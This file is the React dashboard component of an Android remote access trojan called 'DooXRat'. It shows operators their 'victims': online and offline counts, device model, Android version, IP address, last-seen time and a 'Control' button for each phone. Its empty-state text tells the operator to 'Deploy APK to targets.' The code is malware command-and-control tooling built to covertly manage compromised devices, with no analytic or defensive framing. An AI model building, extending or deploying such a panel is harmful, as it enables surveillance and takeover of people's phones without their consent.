import React from 'react';
import { useNavigate } from 'react-router-dom';
import { Activity, Smartphone, User, Clock, LogOut } from 'lucide-react';
import './Dashboard.css';

function Dashboard({ victims, socket, onLogout }) {
  const navigate = useNavigate();

  const onlineVictims = victims.filter(v => v.status === 'online').length;
  const offlineVictims = victims.filter(v => v.status === 'offline').length;

  const formatLastSeen = (timestamp) => {
    const diff = Date.now() - timestamp;
    const minutes = Math.floor(diff / 60000);
    if (minutes < 1) return 'Just now';
    if (minutes < 60) return `${minutes}m ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours}h ago`;
    return `${Math.floor(hours / 24)}d ago`;
  };

  return (
    <div className="dashboard">
      <div className="dashboard-header">
        <div className="header-left">
          <h1>DooXRat Control Panel</h1>
          <p>Full Stack Android Remote Access</p>
        </div>
        <button className="logout-btn" onClick={onLogout}>
          <LogOut size={18} />
          Logout
        </button>
      </div>

      <div className="stats-grid">
        <div className="stat-card">
          <div className="stat-icon online">
            <Activity size={24} />
          </div>
          <div className="stat-info">
            <h3>{onlineVictims}</h3>
            <p>Online Devices</p>
          </div>
        </div>

        <div className="stat-card">
          <div className="stat-icon offline">
            <Smartphone size={24} />
          </div>
          <div className="stat-info">
            <h3>{offlineVictims}</h3>
            <p>Offline Devices</p>
          </div>
        </div>

        <div className="stat-card">
          <div className="stat-icon total">
            <User size={24} />
          </div>
          <div className="stat-info">
            <h3>{victims.length}</h3>
            <p>Total Victims</p>
          </div>
        </div>
      </div>

      <div className="victims-section">
        <h2>Connected Devices</h2>
        <div className="victims-table">
          <table>
            <thead>
              <tr>
                <th>Status</th>
                <th>Device ID</th>
                <th>Model</th>
                <th>Android Version</th>
                <th>IP Address</th>
                <th>Last Seen</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {victims.length === 0 ? (
                <tr>
                  <td colSpan="7" className="no-victims">
                    No victims connected yet. Deploy APK to targets.
                  </td>
                </tr>
              ) : (
                victims.map(victim => (
                  <tr key={victim.id}>
                    <td>
                      <span className={`status-badge ${victim.status}`}>
                        {victim.status === 'online' ? '● Online' : '○ Offline'}
                      </span>
                    </td>
                    <td className="device-id">{victim.id.substring(0, 16)}...</td>
                    <td>{victim.info?.model || 'Unknown'}</td>
                    <td>{victim.info?.androidVersion || 'N/A'}</td>
                    <td>{victim.info?.ipAddress || 'N/A'}</td>
                    <td>
                      <div className="last-seen">
                        <Clock size={14} />
                        {formatLastSeen(victim.lastSeen)}
                      </div>
                    </td>
                    <td>
                      <button 
                        className="control-btn"
                        onClick={() => navigate(`/victim/${victim.id}`)}
                      >
                        Control
                      </button>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

export default Dashboard;
